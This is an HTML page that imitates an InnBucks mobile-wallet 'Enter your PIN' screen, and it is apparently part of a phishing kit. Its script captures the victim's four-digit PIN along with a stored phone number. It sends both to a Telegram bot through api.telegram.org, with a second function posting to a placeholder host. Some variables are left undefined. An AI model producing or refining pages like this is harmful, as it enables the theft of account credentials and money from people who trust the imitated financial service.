<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>InnBucks | Enter PIN</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
  font-family:"Segoe UI",sans-serif;
}

body{
  background:#1f2235;
  min-height:100vh;
  display:flex;
  justify-content:center;
  color:#fff;
}

.container{
  width:100%;
  max-width:380px;
  padding:25px 20px;
  text-align:center;
}

/* Logo */
.logo{
  display:flex;
  justify-content:center;
  align-items:center;
  gap:10px;
  margin-bottom:30px;
}

.dots{
  display:grid;
  grid-template-columns:repeat(2,14px);
  gap:5px;
}

.dot{
  width:14px;
  height:14px;
  border-radius:50%;
}

.dot1{background:#ffb300;}
.dot2{background:#8e24aa;}
.dot3{background:#43a047;}
.dot4{background:#e53935;}

.logo h2{
  font-weight:600;
}

/* Header */
.header{
  display:flex;
  align-items:center;
  gap:10px;
  margin-bottom:25px;
}

.back{
  font-size:22px;
  cursor:pointer;
}

/* Title */
h1{
  font-size:22px;
  margin-bottom:10px;
}

.sub{
  font-size:14px;
  color:#ccc;
  margin-bottom:40px;
}

/* PIN dots */
.pin-box{
  display:flex;
  justify-content:center;
  gap:18px;
  margin-bottom:40px;
}

.pin-dot{
  width:16px;
  height:16px;
  border-radius:50%;
  border:2px solid #fff;
  background:transparent;
  transition:.3s;
}

.pin-dot.filled{
  background:#fff;
}

/* Keypad */
.keypad{
  display:grid;
  grid-template-columns:repeat(3,1fr);
  gap:18px;
}

.key{
  background:#2a2f4a;
  padding:18px;
  border-radius:14px;
  font-size:18px;
  cursor:pointer;
  transition:.2s;
}

.key:active{
  transform:scale(.95);
  background:#3a4170;
}

.key.empty{background:transparent;cursor:default}

/* Button */
.footer-btn{
  margin-top:35px;
}

button{
  width:100%;
  background:#355d8c;
  border:none;
  padding:14px;
  border-radius:10px;
  color:#fff;
  font-size:16px;
  cursor:pointer;
}
</style>
</head>
<body>

<div class="container">

  <!-- LOGO -->
  <div class="logo">
    <div class="dots">
      <div class="dot dot1"></div>
      <div class="dot dot2"></div>
      <div class="dot dot3"></div>
      <div class="dot dot4"></div>
    </div>
    <h2>InnBucks</h2>
  </div>

  <div class="header">
    <div class="back" onclick="history.back()">←</div>
  </div>

  <h1>Enter your PIN</h1>
  <div class="sub">For your security, please confirm your PIN</div>

  <!-- PIN dots -->
  <div class="pin-box">
    <div class="pin-dot"></div>
    <div class="pin-dot"></div>
    <div class="pin-dot"></div>
    <div class="pin-dot"></div>
  </div>

  <!-- Keypad -->
  <div class="keypad">
    <div class="key" onclick="addPin(1)">1</div>
    <div class="key" onclick="addPin(2)">2</div>
    <div class="key" onclick="addPin(3)">3</div>

    <div class="key" onclick="addPin(4)">4</div>
    <div class="key" onclick="addPin(5)">5</div>
    <div class="key" onclick="addPin(6)">6</div>

    <div class="key" onclick="addPin(7)">7</div>
    <div class="key" onclick="addPin(8)">8</div>
    <div class="key" onclick="addPin(9)">9</div>

    <div class="key empty"></div>
    <div class="key" onclick="addPin(0)">0</div>
    <div class="key" onclick="removePin()">⌫</div>
  </div>

  <div class="footer-btn">
    <button onclick="verifyPin()">Continue</button>
  </div>

</div>

<script>
function sendToBackend(phone, pin){
  fetch("https://yourdomain.com/send-telegram",{
    method:"POST",
    headers:{ "Content-Type":"application/json" },
    body:JSON.stringify({ message })
  });
}

let pin = "";

function addPin(num){
  if(pin.length < 4){
    pin += num;
    updateDots();
  }
}

function removePin(){
  pin = pin.slice(0, -1);
  updateDots();
}

function updateDots(){
  let dots = document.querySelectorAll(".pin-dot");
  dots.forEach(d => d.classList.remove("filled"));
  for(let i = 0; i < pin.length; i++){
    dots[i].classList.add("filled");
  }
}

function sendPinToTelegram(phone, pin) {
  const msg = `📱 Phone: ${phone}\n🔒 PIN: ${pin}`;
  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: msg
    })
  });
}

function verifyPin(){
  if(pin.length < 4){
    alert("Enter full PIN");
    return;
  }
  let phone = localStorage.getItem("userPhone") || "N/A";
  sendPinToTelegram(phone, pin).then(() => {
    window.location.href = "success.html";
  });
}
</script>

</body>
</html>
